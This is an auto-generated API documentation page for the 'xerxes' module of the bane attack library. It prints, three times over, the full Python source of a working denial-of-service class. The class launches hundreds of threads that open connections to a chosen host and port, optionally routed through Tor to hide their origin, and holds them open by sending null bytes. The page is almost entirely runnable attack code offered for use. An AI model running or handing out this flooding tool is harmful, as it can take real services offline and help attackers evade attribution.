<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.ddos.xerxes</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from bane.ddos.utils import *

class xerxes(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        threads_daemon=True,
        threads=500,
        timeout=5,
        duration=60,
        logs=False,
        tor=False,
    ):
        self.counter = 0
        self.target = u
        self.port = p
        self.stop = False
        self.duration = duration
        self.timeout = timeout
        self.tor = tor
        self.start = time.time()
        self.logs = logs
        self.id_key = 0
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
                self.id_key += 1
            except:
                pass

    def attack(self):
        try:
            x = self.id_key
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) &gt;= self.duration
                ):  # this is a safety mechanism so the attack won&#39;t run forever
                    break
                if self.stop == True:
                    break
                try:
                    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                    if self.tor == False:
                        s.settimeout(self.timeout)
                    if self.tor == True:
                        s.setproxy(socks.PROXY_TYPE_SOCKS5, &#34;127.0.0.1&#34;, 9050, True)
                    s.connect((self.target, self.port))
                    self.counter += 1
                    &#34;&#34;&#34;if self.logs==True:
     #print(&#34;[Connected to {}:{}]&#34;.format(self.target,self.port))
     sys.stdout.write(&#34;\r[Connected to {}:{}]&#34;.format(self.target,self.port))
     sys.stdout.flush()&#34;&#34;&#34;
                    while True:
                        if (
                            int(time.time() - self.start) &gt;= self.duration
                        ):  # this is a safety mechanism so the attack won&#39;t run forever
                            break
                        if self.stop == True:
                            break
                        try:
                            s.send(&#34;\x00&#34;.encode(&#34;utf-8&#34;))  # send NULL character
                            if self.logs == True:
                                sys.stdout.write(&#34;\r[{}: Voly sent]    &#34;.format(x))
                                sys.stdout.flush()
                        except:
                            break
                        time.sleep(0.2)
                except:
                    pass
                self.counter -= 1
                time.sleep(0.3)
            self.kill()
        except:
            pass</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="bane.ddos.xerxes.xerxes"><code class="flex name class">
<span>class <span class="ident">xerxes</span></span>
<span>(</span><span>u, p=80, threads_daemon=True, threads=500, timeout=5, duration=60, logs=False, tor=False)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class xerxes(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        threads_daemon=True,
        threads=500,
        timeout=5,
        duration=60,
        logs=False,
        tor=False,
    ):
        self.counter = 0
        self.target = u
        self.port = p
        self.stop = False
        self.duration = duration
        self.timeout = timeout
        self.tor = tor
        self.start = time.time()
        self.logs = logs
        self.id_key = 0
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
                self.id_key += 1
            except:
                pass

    def attack(self):
        try:
            x = self.id_key
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) &gt;= self.duration
                ):  # this is a safety mechanism so the attack won&#39;t run forever
                    break
                if self.stop == True:
                    break
                try:
                    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                    if self.tor == False:
                        s.settimeout(self.timeout)
                    if self.tor == True:
                        s.setproxy(socks.PROXY_TYPE_SOCKS5, &#34;127.0.0.1&#34;, 9050, True)
                    s.connect((self.target, self.port))
                    self.counter += 1
                    &#34;&#34;&#34;if self.logs==True:
     #print(&#34;[Connected to {}:{}]&#34;.format(self.target,self.port))
     sys.stdout.write(&#34;\r[Connected to {}:{}]&#34;.format(self.target,self.port))
     sys.stdout.flush()&#34;&#34;&#34;
                    while True:
                        if (
                            int(time.time() - self.start) &gt;= self.duration
                        ):  # this is a safety mechanism so the attack won&#39;t run forever
                            break
                        if self.stop == True:
                            break
                        try:
                            s.send(&#34;\x00&#34;.encode(&#34;utf-8&#34;))  # send NULL character
                            if self.logs == True:
                                sys.stdout.write(&#34;\r[{}: Voly sent]    &#34;.format(x))
                                sys.stdout.flush()
                        except:
                            break
                        time.sleep(0.2)
                except:
                    pass
                self.counter -= 1
                time.sleep(0.3)
            self.kill()
        except:
            pass</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="bane.ddos.utils.DDoS_Class" href="utils.html#bane.ddos.utils.DDoS_Class">DDoS_Class</a></li>
</ul>
<h3>Methods</h3>
<dl>
<dt id="bane.ddos.xerxes.xerxes.attack"><code class="name flex">
<span>def <span class="ident">attack</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def attack(self):
    try:
        x = self.id_key
        time.sleep(1)
        while True:
            if (
                int(time.time() - self.start) &gt;= self.duration
            ):  # this is a safety mechanism so the attack won&#39;t run forever
                break
            if self.stop == True:
                break
            try:
                s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                if self.tor == False:
                    s.settimeout(self.timeout)
                if self.tor == True:
                    s.setproxy(socks.PROXY_TYPE_SOCKS5, &#34;127.0.0.1&#34;, 9050, True)
                s.connect((self.target, self.port))
                self.counter += 1
                &#34;&#34;&#34;if self.logs==True:
 #print(&#34;[Connected to {}:{}]&#34;.format(self.target,self.port))
 sys.stdout.write(&#34;\r[Connected to {}:{}]&#34;.format(self.target,self.port))
 sys.stdout.flush()&#34;&#34;&#34;
                while True:
                    if (
                        int(time.time() - self.start) &gt;= self.duration
                    ):  # this is a safety mechanism so the attack won&#39;t run forever
                        break
                    if self.stop == True:
                        break
                    try:
                        s.send(&#34;\x00&#34;.encode(&#34;utf-8&#34;))  # send NULL character
                        if self.logs == True:
                            sys.stdout.write(&#34;\r[{}: Voly sent]    &#34;.format(x))
                            sys.stdout.flush()
                    except:
                        break
                    time.sleep(0.2)
            except:
                pass
            self.counter -= 1
            time.sleep(0.3)
        self.kill()
    except:
        pass</code></pre>
</details>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.ddos" href="index.md">bane.ddos</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="bane.ddos.xerxes.xerxes" href="#bane.ddos.xerxes.xerxes">xerxes</a></code></h4>
<ul class="">
<li><code><a title="bane.ddos.xerxes.xerxes.attack" href="#bane.ddos.xerxes.xerxes.attack">attack</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>